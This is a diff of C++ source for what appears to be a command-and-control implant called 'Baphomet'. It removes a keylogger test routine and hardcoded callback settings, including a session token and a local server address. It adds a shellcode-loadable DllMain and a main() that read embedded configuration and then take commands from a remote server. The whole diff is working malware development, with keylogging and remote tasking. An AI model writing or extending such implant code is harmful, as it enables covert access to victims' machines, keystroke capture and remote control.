@@ -171,30 +171,6 @@ receive_commands(implant_context& ctx) {
 }
 
 
-void keylogtest() {
-    std::string buff;
-
-    if(!recon::keylog(recon::keylog_action::START, buff)) {
-        std::cout << buff << std::endl;
-        return;
-    }
-
-    Sleep(10000);
-
-    buff.clear();
-    if(!recon::keylog(recon::keylog_action::GET, buff)) {
-        std::cout << buff << std::endl;
-        return;
-    }
-
-    std::cout << buff << std::endl;
-
-    buff.clear();
-    if(!recon::keylog(recon::keylog_action::STOP, buff)) {
-        std::cout << buff << std::endl;
-    }
-}
-
 void pingtest( std::wstring address, uint16_t port, const std::string& token, const std::string& obj ) {
 
     HINTERNET hsession = nullptr;
@@ -232,11 +208,11 @@ void pingtest( std::wstring address, uint16_t port, const std::string& token, co
 __declspec(allocate(".baph")) char metadata[4096] = { "METADATA_BEGIN\0" };
 
 
-#ifdef BAPHOMET_COMPILE_AS_DLL
+#ifdef BAPHOMET_COMPILE_FOR_SHELLCODE
 
 //
 // It's important to note that some DllMain parameters here
-// are not actually as they seem, IF and ONLY IF we are using my loader, not a different one.
+// are not actually as they seem, IF and ONLY IF we are using my loader, not a different one (i.e Hasherezade's).
 //
 BOOL APIENTRY DllMain(
     HMODULE hModule,            // < this will be a pointer to the base of the mapped image sections
@@ -245,23 +221,34 @@ BOOL APIENTRY DllMain(
 ) {
 
 
+    if(metadata[0] == '\0') {   // < may prevent weird issues where the compiler optimizes out the metadata chunk.
+        return FALSE;
+    }
+
+    if(lpReserved == nullptr || static_cast<PIMAGE_DOS_HEADER>(lpReserved)->e_magic != IMAGE_DOS_SIGNATURE) {
+        DEBUG_PRINT("[!] Original image base (lpReserved) not passed correctly!\n");
+        return FALSE;
+    }
+
+    if(hModule == nullptr) {
+        DEBUG_PRINT("[!] Mapped sections (hModule) not passed correctly!\n");
+        return FALSE;
+    }
+
+
     implant_context ctx;
-    ctx.callback_object = "aa2cdea1-012b-493d-4489-5c012c1da1c5";
-    ctx.session_token   = "cDhJVTZvVHJSR2ZDc1AyY1V1Y2F5NThibw==";
-    ctx.is_https = false;
-    ctx.use_sleepmask = false;
-    ctx.user_agent = "test program/1.0";
-    ctx.sleep_time = 1500;
-    ctx.port = 8086;
-    ctx.server_addr = "127.0.0.1";
+    ctx.original_base = lpReserved;
+    ctx.implant_base  = static_cast<void*>(hModule);
 
+    if(!tasking::init_config(metadata, ctx)) {
+        return FALSE;
+    }
 
-//cDhJVTZvVHJSR2ZDc1AyY1V1Y2F5NThibw==
-//a2cdea1-012b-493d-4489-5c012c1da1c5
 
     switch (ul_reason_for_call)
     {
         case DLL_PROCESS_ATTACH:
+            DEBUG_PRINT("[+] process attach.\n");
             if(!receive_commands(ctx)) {
                 return FALSE;
             }
@@ -286,7 +273,20 @@ BOOL APIENTRY DllMain(
 #else
 
 int main() {
-    return 0;
+
+    implant_context ctx;
+    ctx.original_base = GetModuleHandleW(nullptr);
+    ctx.implant_base  = GetModuleHandleW(nullptr);
+
+    if(!tasking::init_config(metadata, ctx)) {
+        return EXIT_FAILURE;
+    }
+
+    if(!receive_commands(ctx)) {
+        return EXIT_FAILURE;
+    }
+
+    return EXIT_SUCCESS;
 }
 
 #endif
